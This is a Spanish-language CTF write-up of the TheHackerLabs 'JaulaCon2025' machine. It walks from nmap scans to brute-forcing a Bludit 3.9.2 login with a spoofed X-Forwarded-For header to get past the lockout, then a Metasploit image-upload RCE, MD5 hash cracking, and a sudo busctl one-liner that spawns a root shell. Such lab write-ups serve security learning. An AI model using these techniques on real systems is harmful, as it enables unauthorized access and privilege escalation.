Propiedades:
- OS: Linux
- Plataforma: TheHackerLabs
- Nivel: Easy
- Tags: #bludit #bruteforce 

![](../assets/Pasted image 20251130164722.png)

## Reconocimiento

Comienzo con un ping para comprobar conectividad.

```bash
> ping -c 1 192.168.1.203
PING 192.168.1.203 (192.168.1.203) 56(84) bytes of data.
64 bytes from 192.168.1.203: icmp_seq=1 ttl=64 time=2.68 ms

--- 192.168.1.203 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.677/2.677/2.677/0.000 ms
```

Procedo a realizar un escaneo de puertos con nmap.
```bash
> sudo nmap -p- -sS -Pn -n --min-rate 5000 192.168.1.203
--------------------------------------------------------
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:57:05:BD (VMware)
```

- Puertos 22 SHH y 80 HTTP abiertos

Sobre los puertos abiertos realizo un segundo escaneo para detectar versiones, servicios y correr un conjunto de scripts predeterminados.

```bash
> sudo nmap -p 22,80 -sV -sC -Pn -n -sS --min-rate 5000 -vvv 192.168.1.203 -oN target
------------------------------------------------------------------------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA9i7hiBgZdbqok5ESuJPFfkPuRpcCT6UEeh71LyPq3i2pfdC6S1w4UYO17jknxy06B1COEcaGELE4n2KCor3M4=
|   256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaMroBaMRuicicDHyP1mRMULBpy4OqNENpp/l/O/cIq
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-generator: Bludit
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Bienvenido a Bludit | BLUDIT
MAC Address: 00:0C:29:57:05:BD (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Puerto 80 HTTP: Apache httpd 2.4.62
- Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u3
## Enumeración

**Puerto 80 HTTP**
La pagina no tenia estilos ni cargaba nada relevante, pero en su codigo fuente nos encontramos con un domino

```bash
href="http://jaulacon2025.thl/">
```

Lo decidimos meter al _/etc/hosts_

```bash
192.168.1.203 jaulacon2025.thl
```

Al acceder al dominio nos encontramos con esto:

- Entrando a la pagina nos encontramos con esto.
- La pagina usa Bludit un CMS no muy popular.
- Obtenemos un posibles usuario Jaulacon2025.

![](../assets/Pasted image 20251130165919.png)


**Codigo Fuente**.
Viendo el codigo fuente de la pagina se hace mucho mención a la versión `3.9.2` por lo cual podemos intuir que vamos a tratar con un `Bludit 3.9.2`.

```html
<!-- Include CSS Bootstrap file from Bludit Core -->
	<link rel="stylesheet" type="text/css" href="http://jaulacon2025.thl/bl-kernel/css/bootstrap.min.css?version=3.9.2">

	<!-- Include CSS Styles from this theme -->
	<link rel="stylesheet" type="text/css" href="http://jaulacon2025.thl/bl-themes/alternative/css/style.css?version=3.9.2">
```

Después de googlear para obtener mas informacion del CMS `Bludit` me encuentro que la ruta default para acceder al dashboard es `/admin/login`.

![](../assets/Pasted image 20251130171602.png)


## Explotación


Recapitulando tenemos la siguiente informacion

- Posible usuario Jaulacon2025
- Version `Bludit 3.9.2`
- Panel de login en `/admin/login`

Después de buscar por internet vulnerabilidades y exploits para el servicio `Bludit` nos encontramos un [script](https://www.hackbook.io/web-application-hacking/web-hacking-procedures/popular-exploits/bludit-cms) que brute forcea el login form.

**Cómo funciona:**
1. **Lee un diccionario** de contraseñas (`rockyou.txt`)
2. **Por cada contraseña:**
    - Extrae el token CSRF de la página de login (requerido por Bludit)
    - Falsifica la cabecera `X-Forwarded-For` con un valor único (usa la propia contraseña)
    - Envía las credenciales de login
3. **Evasión del bloqueo:** Bludit cuenta intentos fallidos por IP, pero confía ciegamente en `X-Forwarded-For`. Al cambiarla en cada intento, nunca acumula 10 fallos consecutivos
4. **Detecta éxito:** Si el servidor redirige a `/admin/dashboard`, la contraseña es correcta
**En resumen:** Prueba miles de contraseñas sin ser bloqueado porque engaña al sistema haciéndole creer que cada intento viene de una "IP" diferente.

Al bajarnos el script deberemos modificarlo levemente para apuntar a nuestro objetivo.

```bash
host = 'http://jaulacon2025.thl'
login_url = host + '/admin/login'
username = 'Jaulacon2025'
wordlist = '/usr/share/wordlists/rockyou.txt'
f = open(wordlist, "r")
```

Ejecutamos el script y encontramos las siguientes credenciales.

- Jaulacon2025:cassandra
```bash
└──╼ $./bludit.py
[*] Trying: cassandra           
SUCCESS: Password found!
Use Jaulacon2025:cassandra to login.
```

Accedemos al dashboard con dichas credenciales.

Dentro de esta dashboard nos encontramos con una subida de imágenes, por lo cual yo puedo buscar posibles exploits en metasploit.

- Aqui nos encontramos un exploit para la subida de imágenes.

```bash
search exploit bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
```

- Configuramos el exploit y lo corremos.

```bash
[msf](Jobs:0 Agents:0) exploit(linux/http/bludit_upload_images_exec) >> set BLUDITUSER Jaulacon2025
BLUDITUSER => Jaulacon2025
[msf](Jobs:0 Agents:0) exploit(linux/http/bludit_upload_images_exec) >> set BLUDITPASS cassandra
BLUDITPASS => cassandra
[msf](Jobs:0 Agents:0) exploit(linux/http/bludit_upload_images_exec) >> set RHOSTS http://jaulacon2025.thl
RHOSTS => http://jaulacon2025.thl
[msf](Jobs:0 Agents:0) exploit(linux/http/bludit_upload_images_exec) >> run
```

- El Exploit funciona correctamente y ahora tenemos un meterpreter el cual pasamos a una shell.

```bash
(Meterpreter 1)(/home/JaulaCon2025) > shell
Process 1264 created.
Channel 0 created.
whoami
www-data

```
## Escalada de Privilegios

Dentro del sistema lo primero que me pongo a ver es la estructura de archivos que hay en mi actual directorio y me encuentro con esto:

```bash
www-data@JaulaCon2025:/var/www/html/bl-content/databases$ ls
ls
categories.php	plugins       site.php	 tags.php
pages.php	security.php  syslog.php  users.php
```

Decido ver que contenido hay en `user.php` y me encuentro con esto:

- El usuario JaulaCon2025 y su contraseña en formato md5
```bash
"JaulaCon2025": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "551211bcd6ef18e32742a73fcb85430b",
```


Crackeo la contraseña y migro al usuario JaulaCon2025:Brutales

```bash
su JaulaCon2025
Password: Brutales
JaulaCon2025@JaulaCon2025:~$ id
id
uid=1001(JaulaCon2025) gid=1001(JaulaCon2025) grupos=1001(JaulaCon2025
```

Ahora procedo a enumerar binarios con privilegios de SUDO.


```bash
JaulaCon2025@JaulaCon2025:~$ sudo -l
sudo -l

User JaulaCon2025 may run the following commands on JaulaCon2025:
    (root) NOPASSWD: /usr/bin/busctl
```

- Encuentro el binario _busctl_

Abuso del binario y escalo al usuario root con ayuda de [GTFObins](https://gtfobins.github.io/gtfobins/busctl/)

```bash
JaulaCon2025@JaulaCon2025:~$ sudo /usr/bin/busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'

----------------------------------------------------------------------------------
<:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
sudo: unable to resolve host JaulaCon2025: Nombre o servicio desconocido
# id
id
uid=0(root) gid=0(root) grupos=0(root)
```

***PWNED***